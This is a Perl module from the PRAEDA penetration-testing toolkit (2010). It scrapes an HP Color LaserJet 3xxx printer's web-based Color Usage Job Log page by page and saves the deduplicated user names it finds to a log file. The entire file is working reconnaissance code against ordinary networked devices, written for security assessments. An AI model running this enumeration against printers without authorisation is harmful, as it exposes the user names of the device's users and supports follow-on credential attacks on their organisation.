# HP COLOR LASERJET 3XXX Series Module for enumerating 
# user names from the Color Usage Job Logs.
######################################################
#                  PRAEDA Module #MP0002             #
#          Copyright (C) 2010 Foofus.net	     #
#               Deral "percX" Heiland                #
######################################################
package MP0002;
sub MP0002 
{

# Set global variables
my $count = 0;
my $num = 15;
my $loopy = 0;
my $strtrcd = 0;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];
my $jobs = 0;



open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
print "Attempting to enumerate User Names from COLOR USAGE JOB LOG :MP0002\n";
print OUTFILE "Attempting to enumerate User Names from COLOR USAGE JOB LOG :MP0002\n";
open(TEMP, ">./$OUTPUT/temp_data.txt")|| die("Failed to open  Output file temp_data.txt \n");


# extract print job log count-----start-----

my $html = HTML::TagParser->new( "http$web://$TARGET/hp/device/this.LCDispatcher?nav=hp.ColorUsage" );
    my @list = $html->getElementsByTagName( "div" );
    foreach my $elem ( @list )
    {
        my $text = $elem->innerText;
          if ($count eq 37)
               {
                $jobs = $text;
                $loopy = int($jobs/100)+1
               }
        $count = $count+1;
    }

# reset counter
$count = 0;

# extract print job log count------end-----


# HP Color Laserjet 3xxx user name recovery loop-----start-----

for(my $counter = 1; $counter <= $loopy; $counter++)
 {
my $html = HTML::TagParser->new( "http$web://$TARGET/hp/device/this.LCDispatcher?nav=hp.ColorUsage&startRecord=$strtrcd" );
    my @list = $html->getElementsByTagName( "td" );
    foreach my $elem ( @list ) 
    {
        my $text = $elem->innerText;
            
          if (( $text eq "" ) && ($num eq $count)) 
               {
                $num = $num+7;
               }
	  else 
               {
                  if ($num eq $count)
                     {
                        print TEMP "$text\n"; 
			$num = $num+7;
                     }
                  else 
                    {
                    }
             } 
	$count = $count+1;
    }
$strtrcd = ($strtrcd+100);
#counter resets
 $count = 0;
 $num = 15;
 }

# sort/uniq temp_data and output
close TEMP;
open (IN, "<./$OUTPUT/temp_data.txt")  or die "Couldn't open input file: $!";
my %hTmp;
while (my $sLine = <IN>) {
        next if $sLine =~ m/^\s*$/; #remove empty lines. Without this, still destroys empty lines except for the first one.
        $sLine=~s/^\s+//; #strip leading/trailing whitespace
        $sLine=~s/\s+$//;
        print OUTFILE qq{$sLine\n} unless ($hTmp{$sLine}++);
                        }
close (IN);
unlink("./$OUTPUT/temp_data.txt");

#HP Color Laserjet 3xxx user name recovery loop-----end------

# operation completed close out output files
close(OUTFILE);
}
		
1;
